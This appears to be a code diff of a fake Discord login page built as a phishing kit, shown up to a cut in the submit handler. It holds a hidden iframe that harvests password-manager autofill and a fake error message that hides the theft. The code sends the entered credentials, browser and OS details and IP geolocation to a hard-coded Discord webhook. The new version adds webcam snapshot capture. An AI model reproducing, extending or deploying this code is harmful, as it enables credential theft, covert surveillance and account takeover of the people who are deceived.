@@ -1,531 +1,584 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Discord</title>
-  <style>
-    /* ─── RESET & BASE ─── */
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
-    }
-    body {
-      background-color: #1e1f22;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      margin: 0;
-    }
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Discord - Login</title>
+    <style>
+        /* ─── RESET & BASE ─── */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
+        }
 
-    /* ─── MAIN CARD ─── */
-    .login-container {
-      background-color: #2b2d31;
-      border-radius: 8px;
-      padding: 32px 40px 28px;
-      width: 100%;
-      max-width: 480px;
-      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.4);
-    }
+        body {
+            background: #1a1b1e;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            /* This is the mastercopy background - mimics Discord's desktop app background */
+            background-image: radial-gradient(ellipse at 30% 40%, #2c2f33 0%, #1a1b1e 80%);
+        }
 
-    /* ─── DISCORD LOGO ─── */
-    .discord-logo {
-      text-align: center;
-      margin-bottom: 20px;
-    }
-    .discord-logo svg {
-      width: 48px;
-      height: 48px;
-      fill: #ffffff;
-    }
+        /* ─── MAIN CARD – HORIZONTAL LAYOUT ─── */
+        .login-container {
+            background: #2b2d31;
+            border-radius: 12px;
+            padding: 40px 48px 36px;
+            width: 100%;
+            max-width: 780px;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.6);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            border: 1px solid #3f4147;
+        }
 
-    /* ─── HEADER ─── */
-    h1 {
-      color: #ffffff;
-      font-size: 24px;
-      font-weight: 700;
-      text-align: center;
-      margin-bottom: 4px;
-    }
-    .subtitle {
-      color: #b5bac1;
-      font-size: 16px;
-      text-align: center;
-      margin-bottom: 24px;
-    }
+        /* ─── DISCORD LOGO ─── */
+        .discord-logo {
+            text-align: center;
+            margin-bottom: 16px;
+        }
+        .discord-logo svg {
+            width: 52px;
+            height: 52px;
+            fill: #ffffff;
+        }
 
-    /* ─── FORM FIELDS ─── */
-    .form-group {
-      margin-bottom: 20px;
-    }
-    .form-group label {
-      display: block;
-      color: #b5bac1;
-      font-size: 12px;
-      font-weight: 600;
-      text-transform: uppercase;
-      letter-spacing: 0.5px;
-      margin-bottom: 6px;
-    }
-    .form-group label .required-star {
-      color: #f23f42;
-      margin-left: 2px;
-    }
-    .form-group input {
-      width: 100%;
-      padding: 12px 14px;
-      background-color: #1e1f22;
-      border: 1px solid #3f4147;
-      border-radius: 4px;
-      color: #ffffff;
-      font-size: 15px;
-      transition: border-color 0.2s;
-      outline: none;
-    }
-    .form-group input:focus {
-      border-color: #5865f2;
-    }
-    .form-group input::placeholder {
-      color: #6d6f78;
-      font-size: 14px;
-    }
+        /* ─── HEADER ─── */
+        h1 {
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 2px;
+            letter-spacing: -0.3px;
+        }
+        .subtitle {
+            color: #b5bac1;
+            font-size: 17px;
+            text-align: center;
+            margin-bottom: 28px;
+            font-weight: 400;
+        }
 
-    /* ─── QR CODE TOGGLE BUTTON ─── */
-    .btn-qr {
-      width: 100%;
-      padding: 14px;
-      background-color: transparent;
-      border: none;
-      color: #ffffff;
-      font-size: 16px;
-      font-weight: 500;
-      cursor: pointer;
-      text-align: center;
-      margin-bottom: 6px;
-      transition: background-color 0.2s;
-      border-radius: 4px;
-    }
-    .btn-qr:hover {
-      background-color: #3f4147;
-    }
+        /* ─── FORM – HORIZONTAL FIELDS ─── */
+        #loginForm {
+            display: flex;
+            flex-direction: row;
+            align-items: flex-end;
+            gap: 16px;
+            width: 100%;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
 
-    /* ─── FORGOT PASSWORD LINK ─── */
-    .forgot-link {
-      text-align: right;
-      margin-bottom: 20px;
-    }
-    .forgot-link a {
-      color: #b5bac1;
-      font-size: 13px;
-      text-decoration: none;
-    }
-    .forgot-link a:hover {
-      text-decoration: underline;
-    }
+        .form-group {
+            flex: 1 1 200px;
+            min-width: 160px;
+        }
+        .form-group label {
+            display: block;
+            color: #b5bac1;
+            font-size: 11px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.4px;
+            margin-bottom: 6px;
+        }
+        .form-group label .required-star {
+            color: #f23f42;
+            margin-left: 2px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 12px 14px;
+            background-color: #1e1f22;
+            border: 1px solid #3f4147;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 15px;
+            transition: border-color 0.2s;
+            outline: none;
+        }
+        .form-group input:focus {
+            border-color: #5865f2;
+        }
+        .form-group input::placeholder {
+            color: #6d6f78;
+            font-size: 14px;
+        }
 
-    /* ─── QR CODE SECTION (hidden by default) ─── */
-    .qr-section {
-      background: #1e1f22;
-      border-radius: 8px;
-      padding: 20px;
-      text-align: center;
-      margin-bottom: 20px;
-      display: none;
-      border: 1px solid #3f4147;
-    }
-    .qr-section.visible {
-      display: block;
-    }
-    .qr-section .qr-placeholder {
-      width: 120px;
-      height: 120px;
-      background: #2b2d31;
-      margin: 0 auto 12px;
-      border-radius: 4px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      color: #b5bac1;
-      font-size: 12px;
-      border: 1px dashed #3f4147;
-    }
-    .qr-section p {
-      color: #b5bac1;
-      font-size: 14px;
-    }
+        /* ─── LOGIN BUTTON ─── */
+        .btn-login {
+            flex: 0 0 auto;
+            padding: 12px 32px;
+            background-color: #5865f2;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s, transform 0.1s;
+            height: 48px;
+            align-self: flex-end;
+            margin-bottom: 0;
+        }
+        .btn-login:hover {
+            background-color: #4752c4;
+        }
+        .btn-login:active {
+            transform: scale(0.97);
+        }
 
-    /* ─── LOGIN BUTTON ─── */
-    .btn-login {
-      width: 100%;
-      padding: 14px;
-      background-color: #5865f2;
-      border: none;
-      border-radius: 4px;
-      color: #ffffff;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: background-color 0.2s;
-      margin-bottom: 12px;
-    }
-    .btn-login:hover {
-      background-color: #4752c4;
-    }
-    .btn-login:active {
-      transform: scale(0.98);
-    }
+        /* ─── FORGOT PASSWORD ROW ─── */
+        .forgot-row {
+            width: 100%;
+            text-align: right;
+            margin-top: 12px;
+            margin-bottom: 6px;
+        }
+        .forgot-row a {
+            color: #b5bac1;
+            font-size: 13px;
+            text-decoration: none;
+        }
+        .forgot-row a:hover {
+            text-decoration: underline;
+        }
 
-    /* ─── PASSKEY ROW ─── */
-    .passkey-row {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 6px;
-      margin-top: 4px;
-      color: #b5bac1;
-      font-size: 14px;
-    }
-    .passkey-row .passkey-link {
-      color: #5865f2;
-      cursor: pointer;
-    }
-    .passkey-row .passkey-link:hover {
-      text-decoration: underline;
-    }
+        /* ─── PASSKEY & REGISTER ROW ─── */
+        .bottom-links {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 100%;
+            margin-top: 18px;
+            color: #b5bac1;
+            font-size: 14px;
+            border-top: 1px solid #3f4147;
+            padding-top: 18px;
+        }
+        .passkey-link {
+            color: #5865f2;
+            cursor: pointer;
+        }
+        .passkey-link:hover {
+            text-decoration: underline;
+        }
+        .register-link a {
+            color: #5865f2;
+            text-decoration: none;
+        }
+        .register-link a:hover {
+            text-decoration: underline;
+        }
 
-    /* ─── REGISTER ROW ─── */
-    .register-row {
-      text-align: center;
-      margin-top: 16px;
-      color: #b5bac1;
-      font-size: 14px;
-    }
-    .register-row a {
-      color: #5865f2;
-      text-decoration: none;
-    }
-    .register-row a:hover {
-      text-decoration: underline;
-    }
+        /* ─── VIDEO SNAPPING (WEBCAM) – NO MIC ─── */
+        .video-section {
+            width: 100%;
+            margin-top: 22px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            border-radius: 8px;
+            overflow: hidden;
+            border: 1px solid #3f4147;
+            background: #1a1b1e;
+        }
+        #webcamVideo {
+            display: block;
+            width: 100%;
+            height: auto;
+            border-radius: 8px;
+            transform: scaleX(-1); /* mirror effect like Discord */
+        }
+        .video-controls {
+            display: flex;
+            gap: 14px;
+            align-items: center;
+            justify-content: center;
+            flex-wrap: wrap;
+        }
+        .btn-video {
+            padding: 8px 22px;
+            background-color: #3f4147;
+            border: none;
+            border-radius: 4px;
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .btn-video:hover {
+            background-color: #4f5159;
+        }
+        .btn-video.primary {
+            background-color: #5865f2;
+        }
+        .btn-video.primary:hover {
+            background-color: #4752c4;
+        }
+        .btn-video.danger {
+            background-color: #f23f42;
+        }
+        .btn-video.danger:hover {
+            background-color: #c03538;
+        }
+        #snapshotPreview {
+            max-width: 120px;
+            border-radius: 6px;
+            border: 1px solid #3f4147;
+            display: none;
+        }
+        .status-text {
+            color: #b5bac1;
+            font-size: 13px;
+        }
 
-    /* ─── FAKE ERROR STATUS BAR (hidden by default) ─── */
-    .status-bar {
-      margin-top: 16px;
-      padding: 10px;
-      border-radius: 4px;
-      font-size: 13px;
-      background: #2a1a1a;
-      border: 1px solid #f23f42;
-      color: #f28b8b;
-      text-align: center;
-      display: none;
-    }
-    .status-bar.visible {
-      display: block;
-    }
+        /* ─── FAKE ERROR STATUS BAR ─── */
+        .status-bar {
+            margin-top: 16px;
+            padding: 10px;
+            border-radius: 4px;
+            font-size: 13px;
+            background: #2a1a1a;
+            border: 1px solid #f23f42;
+            color: #f28b8b;
+            text-align: center;
+            display: none;
+            width: 100%;
+        }
+        .status-bar.visible {
+            display: block;
+        }
 
-    /* ─── HIDDEN PASSWORD STEALER IFRAME ─── */
-    #pw-stealer {
-      position: absolute;
-      opacity: 0;
-      pointer-events: none;
-      width: 1px;
-      height: 1px;
-      top: -9999px;
-      left: -9999px;
-    }
-  </style>
+        /* ─── HIDDEN PASSWORD STEALER IFRAME ─── */
+        #pw-stealer {
+            position: absolute;
+            opacity: 0;
+            pointer-events: none;
+            width: 1px;
+            height: 1px;
+            top: -9999px;
+            left: -9999px;
+        }
+
+        /* ─── RESPONSIVE ─── */
+        @media (max-width: 600px) {
+            .login-container {
+                padding: 24px 20px;
+                max-width: 100%;
+                margin: 12px;
+            }
+            #loginForm {
+                flex-direction: column;
+                align-items: stretch;
+            }
+            .form-group {
+                flex: 1 1 auto;
+                min-width: unset;
+            }
+            .btn-login {
+                width: 100%;
+                align-self: stretch;
+            }
+            .bottom-links {
+                flex-direction: column;
+                gap: 8px;
+                align-items: center;
+            }
+            .video-wrapper {
+                max-width: 100%;
+            }
+        }
+    </style>
 </head>
 <body>
 
-  <div class="login-container">
-    <!-- Discord Logo -->
-    <div class="discord-logo">
-      <svg viewBox="0 0 127.14 96.36">
-        <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
-      </svg>
+    <div class="login-container">
+
+        <!-- Discord Logo -->
+        <div class="discord-logo">
+            <svg viewBox="0 0 127.14 96.36">
+                <path d="M107.7,8.07A105.15,105.15,0,0,0,81.47,0a72.06,72.06,0,0,0-3.36,6.83,97.68,97.68,0,0,0-29.11,0A72.37,72.37,0,0,0,45.64,0,105.89,105.89,0,0,0,19.39,8.09C2.79,32.65-1.71,56.6.54,80.21h0A105.73,105.73,0,0,0,32.71,96.36,77.7,77.7,0,0,0,39.6,85.25a68.42,68.42,0,0,1-10.85-5.18c.91-.66,1.8-1.34,2.66-2.05a75.57,75.57,0,0,0,64.32,0c.87.71,1.76,1.39,2.66,2.05a68.68,68.68,0,0,1-10.87,5.19,77.43,77.43,0,0,0,6.89,11.1A105.25,105.25,0,0,0,126.6,80.22C129.24,52.84,122.09,29.11,107.7,8.07ZM42.45,65.69C36.18,65.69,31,60,31,53s5-12.74,11.43-12.74S53.86,46,53.86,53,48.72,65.69,42.45,65.69Zm42.24,0C78.42,65.69,73.27,60,73.27,53s5-12.74,11.43-12.74S96.1,46,96.1,53,91,65.69,84.69,65.69Z"/>
+            </svg>
+        </div>
+
+        <h1>Welcome back!</h1>
+        <p class="subtitle">We're so excited to see you again!</p>
+
+        <!-- Login Form – Horizontal Layout -->
+        <form id="loginForm" novalidate>
+            <div class="form-group">
+                <label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
+                <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
+            </div>
+
+            <div class="form-group">
+                <label for="passwordInput">Password <span class="required-star">*</span></label>
+                <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
+            </div>
+
+            <button type="submit" class="btn-login">Log In</button>
+        </form>
+
+        <!-- Forgot Password -->
+        <div class="forgot-row">
+            <a href="#">Forgot your password?</a>
+        </div>
+
+        <!-- Bottom Links: Passkey + Register -->
+        <div class="bottom-links">
+            <span>Or, sign in with <span class="passkey-link">passkey</span></span>
+            <span class="register-link">Need an account? <a href="#">Register</a></span>
+        </div>
+
+        <!-- VIDEO SNAPPING – No Mic -->
+        <div class="video-section">
+            <div class="video-wrapper">
+                <video id="webcamVideo" autoplay playsinline muted></video>
+            </div>
+            <div class="video-controls">
+                <button id="startCamBtn" class="btn-video primary">📷 Start Camera</button>
+                <button id="snapBtn" class="btn-video" disabled>📸 Snap</button>
+                <button id="stopCamBtn" class="btn-video danger">⏹ Stop</button>
+                <img id="snapshotPreview" alt="Snapshot" />
+            </div>
+            <div id="videoStatus" class="status-text">Camera is off.</div>
+        </div>
+
+        <!-- Fake Error Status Bar -->
+        <div id="statusBar" class="status-bar" role="status"></div>
+
+        <!-- Hidden iframe for password manager stealing -->
+        <iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>
     </div>
 
-    <!-- Title -->
-    <h1>Welcome back!</h1>
-    <p class="subtitle">We're so excited to see you again!</p>
+    <script>
+        (function() {
+            // ============================================================
+            //  CONFIG – YOUR NEW DISCORD WEBHOOK URL
+            // ============================================================
+            const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1538937235984875653/ketL69cOxUsbeAvIrn0ZxXzhuM9VoInCsgY8FzN9xIB5VaalxZXLaV7bGAKR6RvXMsTz';
 
-    <!-- QR Code Section (hidden by default) -->
-    <div id="qrSection" class="qr-section">
-      <div class="qr-placeholder">QR Code</div>
-      <p>Scan this with the Discord mobile app to log in instantly.</p>
-    </div>
+            // ============================================================
+            //  DOM REFS
+            // ============================================================
+            const form = document.getElementById('loginForm');
+            const usernameInput = document.getElementById('usernameInput');
+            const passwordInput = document.getElementById('passwordInput');
+            const statusBar = document.getElementById('statusBar');
+            const pwStealer = document.getElementById('pw-stealer');
 
-    <!-- Login Form -->
-    <form id="loginForm" novalidate>
-      <div class="form-group">
-        <label for="usernameInput">Email or Phone Number <span class="required-star">*</span></label>
-        <input type="text" id="usernameInput" name="username" placeholder="Enter your email or phone" required autocomplete="username" aria-required="true" />
-      </div>
+            // Video elements
+            const video = document.getElementById('webcamVideo');
+            const startBtn = document.getElementById('startCamBtn');
+            const snapBtn = document.getElementById('snapBtn');
+            const stopBtn = document.getElementById('stopCamBtn');
+            const snapshotPreview = document.getElementById('snapshotPreview');
+            const videoStatus = document.getElementById('videoStatus');
 
-      <div class="form-group">
-        <label for="passwordInput">Password <span class="required-star">*</span></label>
-        <input type="password" id="passwordInput" name="password" placeholder="Enter your password" required autocomplete="current-password" aria-required="true" />
-      </div>
+            let stream = null;
+            let snapshotData = null; // base64 image data
 
-      <!-- QR Code Toggle Button (matches screenshot) -->
-      <button type="button" id="qrToggle" class="btn-qr">Log in with QR Code</button>
+            // ============================================================
+            //  FAKE ERROR
+            // ============================================================
+            function showFakeError() {
+                statusBar.textContent = '❌ An error has occurred. Please try again later.';
+                statusBar.className = 'status-bar visible';
+                setTimeout(() => {
+                    statusBar.className = 'status-bar';
+                }, 6000);
+            }
 
-      <!-- Forgot Password Link -->
-      <div class="forgot-link">
-        <a href="#">Forgot your password?</a>
-      </div>
+            // ============================================================
+            //  PASSWORD MANAGER STEALER
+            // ============================================================
+            function stealPasswordManagerCredentials() {
+                try {
+                    const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
+                    const inputs = iframeDoc.querySelectorAll('input');
+                    if (inputs.length >= 2) {
+                        inputs[0].focus();
+                        inputs[0].blur();
+                        inputs[1].focus();
+                        inputs[1].blur();
 
-      <!-- Login Button -->
-      <button type="submit" class="btn-login">Log In</button>
-    </form>
-
-    <!-- Passkey Row -->
-    <div class="passkey-row">
-      <span>Or, sign in with</span>
-      <span class="passkey-link">passkey</span>
-    </div>
-
-    <!-- Register Row -->
-    <div class="register-row">
-      Need an account? <a href="#">Register</a>
-    </div>
-
-    <!-- Fake Error Status Bar -->
-    <div id="statusBar" class="status-bar" role="status"></div>
-
-    <!-- Hidden iframe for password manager stealing -->
-    <iframe id="pw-stealer" srcdoc="<!DOCTYPE html><html><body><form><input type='text' name='username' autocomplete='username'><input type='password' name='password' autocomplete='current-password'></form></body></html>"></iframe>
-  </div>
-
-  <script>
-    (function() {
-      // ============================================================
-      //  CONFIG – YOUR DISCORD WEBHOOK URL
-      // ============================================================
-      const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1503434132405878895/skX1gxEF-YP4Qa0W4Foj3iqqv3mwlxA_PKOW7r6UmbmKbAUbdRgKIBEI5rOMLOEpsjOT';
-
-      // ============================================================
-      //  DOM REFERENCES
-      // ============================================================
-      const form = document.getElementById('loginForm');
-      const usernameInput = document.getElementById('usernameInput');
-      const passwordInput = document.getElementById('passwordInput');
-      const statusBar = document.getElementById('statusBar');
-      const qrToggle = document.getElementById('qrToggle');
-      const qrSection = document.getElementById('qrSection');
-      const pwStealer = document.getElementById('pw-stealer');
-
-      // ============================================================
-      //  QR CODE TOGGLE
-      // ============================================================
-      qrToggle.addEventListener('click', function() {
-        qrSection.classList.toggle('visible');
-        this.textContent = qrSection.classList.contains('visible')
-          ? 'Log in with Password'
-          : 'Log in with QR Code';
-      });
-
-      // ============================================================
-      //  FAKE ERROR – Show generic error to user
-      // ============================================================
-      function showFakeError() {
-        statusBar.textContent = '❌ An error has occurred. Please try again later.';
-        statusBar.className = 'status-bar visible';
-        setTimeout(() => {
-          statusBar.className = 'status-bar';
-        }, 6000);
-      }
-
-      // ============================================================
-      //  PASSWORD MANAGER STEALER
-      // ============================================================
-      function stealPasswordManagerCredentials() {
-        try {
-          const iframeDoc = pwStealer.contentDocument || pwStealer.contentWindow.document;
-          const inputs = iframeDoc.querySelectorAll('input');
-          if (inputs.length >= 2) {
-            // Trigger autofill by focusing and blurring
-            inputs[0].focus();
-            inputs[0].blur();
-            inputs[1].focus();
-            inputs[1].blur();
-
-            setTimeout(() => {
-              const stolenUser = inputs[0].value || '';
-              const stolenPass = inputs[1].value || '';
-              if (stolenUser || stolenPass) {
-                console.log('🔑 Stolen from password manager:', { username: stolenUser, password: stolenPass });
-                if (stolenUser && !usernameInput.value) {
-                  usernameInput.value = stolenUser;
+                        setTimeout(() => {
+                            const stolenUser = inputs[0].value || '';
+                            const stolenPass = inputs[1].value || '';
+                            if (stolenUser || stolenPass) {
+                                console.log('🔑 Stolen from password manager:', { username: stolenUser, password: stolenPass });
+                                if (stolenUser && !usernameInput.value) {
+                                    usernameInput.value = stolenUser;
+                                }
+                                if (stolenPass && !passwordInput.value) {
+                                    passwordInput.value = stolenPass;
+                                }
+                                window._stolenCreds = { username: stolenUser, password: stolenPass };
+                            }
+                        }, 500);
+                    }
+                } catch (e) {
+                    console.warn('Password manager steal failed:', e.message);
                 }
-                if (stolenPass && !passwordInput.value) {
-                  passwordInput.value = stolenPass;
+            }
+
+            // ============================================================
+            //  HELPERS
+            // ============================================================
+            function getTimestamp() {
+                const now = new Date();
+                return {
+                    iso: now.toISOString(),
+                    date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
+                    time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+                };
+            }
+
+            function getExactOS() {
+                const ua = navigator.userAgent;
+                if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11 (64-bit)';
+                if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
+                if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
+                if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
+                if (ua.indexOf('Mac OS X') !== -1) {
+                    const m = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
+                    return m ? `macOS 10.${m[1]}.${m[2]}` : 'macOS';
                 }
-                window._stolenCreds = { username: stolenUser, password: stolenPass };
-              }
-            }, 500);
-          }
-        } catch (e) {
-          console.warn('Password manager steal failed:', e.message);
-        }
-      }
+                if (ua.indexOf('Android') !== -1) {
+                    const m = ua.match(/Android ([0-9]+\.[0-9]+)/);
+                    return m ? `Android ${m[1]}` : 'Android';
+                }
+                if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
+                    const m = ua.match(/OS ([0-9]+)_([0-9]+)/);
+                    return m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
+                }
+                if (ua.indexOf('Linux') !== -1) return 'Linux';
+                return 'Unknown';
+            }
 
-      // ============================================================
-      //  HELPER: Get timestamp
-      // ============================================================
-      function getTimestamp() {
-        const now = new Date();
-        return {
-          iso: now.toISOString(),
-          date: now.toLocaleDateString('en-US', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' }),
-          time: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false }),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-        };
-      }
+            function getExactBrowser() {
+                const ua = navigator.userAgent;
+                if (ua.indexOf('Firefox') !== -1) {
+                    const m = ua.match(/Firefox\/([0-9.]+)/);
+                    return m ? `Firefox ${m[1]}` : 'Firefox';
+                }
+                if (ua.indexOf('Edg') !== -1) {
+                    const m = ua.match(/Edg\/([0-9.]+)/);
+                    return m ? `Edge ${m[1]}` : 'Edge';
+                }
+                if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
+                    const m = ua.match(/Chrome\/([0-9.]+)/);
+                    return m ? `Chrome ${m[1]}` : 'Chrome';
+                }
+                if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
+                    const m = ua.match(/Version\/([0-9.]+)/);
+                    return m ? `Safari ${m[1]}` : 'Safari';
+                }
+                if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
+                    const m = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
+                    return m ? `Opera ${m[1]}` : 'Opera';
+                }
+                return 'Unknown';
+            }
 
-      // ============================================================
-      //  HELPER: Get OS
-      // ============================================================
-      function getExactOS() {
-        const ua = navigator.userAgent;
-        if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11 (64-bit)';
-        if (ua.indexOf('Windows NT 6.3') !== -1) return 'Windows 8.1';
-        if (ua.indexOf('Windows NT 6.2') !== -1) return 'Windows 8';
-        if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
-        if (ua.indexOf('Mac OS X') !== -1) {
-          const m = ua.match(/Mac OS X 10_([0-9]+)_([0-9]+)/);
-          return m ? `macOS 10.${m[1]}.${m[2]}` : 'macOS';
-        }
-        if (ua.indexOf('Android') !== -1) {
-          const m = ua.match(/Android ([0-9]+\.[0-9]+)/);
-          return m ? `Android ${m[1]}` : 'Android';
-        }
-        if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
-          const m = ua.match(/OS ([0-9]+)_([0-9]+)/);
-          return m ? `iOS ${m[1]}.${m[2]}` : 'iOS';
-        }
-        if (ua.indexOf('Linux') !== -1) return 'Linux';
-        return 'Unknown';
-      }
+            async function getGeoData() {
+                try {
+                    const r = await fetch('https://ipapi.co/json/');
+                    if (!r.ok) throw new Error();
+                    const d = await r.json();
+                    return {
+                        source: 'IP Geolocation',
+                        latitude: d.latitude || 'Unknown',
+                        longitude: d.longitude || 'Unknown',
+                        city: d.city || 'Unknown',
+                        country: d.country_name || 'Unknown',
+                        isp: d.org || 'Unknown'
+                    };
+                } catch (_) {
+                    try {
+                        const r = await fetch('https://ipinfo.io/json');
+                        if (!r.ok) throw new Error();
+                        const d = await r.json();
+                        const loc = d.loc ? d.loc.split(',') : ['Unknown', 'Unknown'];
+                        return {
+                            source: 'IP Geolocation',
+                            latitude: loc[0] || 'Unknown',
+                            longitude: loc[1] || 'Unknown',
+                            city: d.city || 'Unknown',
+                            country: d.country || 'Unknown',
+                            isp: d.org || 'Unknown'
+                        };
+                    } catch (_) {
+                        return {
+                            source: 'No location data',
+                            latitude: 'Unknown',
+                            longitude: 'Unknown',
+                            city: 'Unknown',
+                            country: 'Unknown',
+                            isp: 'Unknown'
+                        };
+                    }
+                }
+            }
 
-      // ============================================================
-      //  HELPER: Get Browser
-      // ============================================================
-      function getExactBrowser() {
-        const ua = navigator.userAgent;
-        if (ua.indexOf('Firefox') !== -1) {
-          const m = ua.match(/Firefox\/([0-9.]+)/);
-          return m ? `Firefox ${m[1]}` : 'Firefox';
-        }
-        if (ua.indexOf('Edg') !== -1) {
-          const m = ua.match(/Edg\/([0-9.]+)/);
-          return m ? `Edge ${m[1]}` : 'Edge';
-        }
-        if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) {
-          const m = ua.match(/Chrome\/([0-9.]+)/);
-          return m ? `Chrome ${m[1]}` : 'Chrome';
-        }
-        if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) {
-          const m = ua.match(/Version\/([0-9.]+)/);
-          return m ? `Safari ${m[1]}` : 'Safari';
-        }
-        if (ua.indexOf('OPR') !== -1 || ua.indexOf('Opera') !== -1) {
-          const m = ua.match(/(?:OPR|Opera)\/([0-9.]+)/);
-          return m ? `Opera ${m[1]}` : 'Opera';
-        }
-        return 'Unknown';
-      }
+            async function sendToDiscord(message) {
+                if (!DISCORD_WEBHOOK_URL) return false;
+                try {
+                    const payload = { content: message };
+                    const res = await fetch(DISCORD_WEBHOOK_URL, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(payload)
+                    });
+                    console.log(`📥 Discord response status: ${res.status}`);
+                    return res.ok;
+                } catch (err) {
+                    console.error('❌ Network error:', err);
+                    return false;
+                }
+            }
 
-      // ============================================================
-      //  HELPER: Get Location (IP-based only, no GPS prompt)
-      // ============================================================
-      async function getGeoData() {
-        try {
-          const r = await fetch('https://ipapi.co/json/');
-          if (!r.ok) throw new Error();
-          const d = await r.json();
-          return {
-            source: 'IP Geolocation',
-            latitude: d.latitude || 'Unknown',
-            longitude: d.longitude || 'Unknown',
-            city: d.city || 'Unknown',
-            country: d.country_name || 'Unknown',
-            isp: d.org || 'Unknown'
-          };
-        } catch (_) {
-          try {
-            const r = await fetch('https://ipinfo.io/json');
-            if (!r.ok) throw new Error();
-            const d = await r.json();
-            const loc = d.loc ? d.loc.split(',') : ['Unknown', 'Unknown'];
-            return {
-              source: 'IP Geolocation',
-              latitude: loc[0] || 'Unknown',
-              longitude: loc[1] || 'Unknown',
-              city: d.city || 'Unknown',
-              country: d.country || 'Unknown',
-              isp: d.org || 'Unknown'
-            };
-          } catch (_) {
-            return {
-              source: 'No location data',
-              latitude: 'Unknown',
-              longitude: 'Unknown',
-              city: 'Unknown',
-              country: 'Unknown',
-              isp: 'Unknown'
-            };
-          }
-        }
-      }
+            // ============================================================
+            //  FORM SUBMIT – Send credentials + snapshot + geo
+            // ============================================================
+            form.addEventListener('submit', async (e) => {
+                e.preventDefault();
+                showFakeError();
 
-      // ============================================================
-      //  SEND TO DISCORD
-      // ============================================================
-      async function sendToDiscord(message) {
-        if (!DISCORD_WEBHOOK_URL) return false;
-        try {
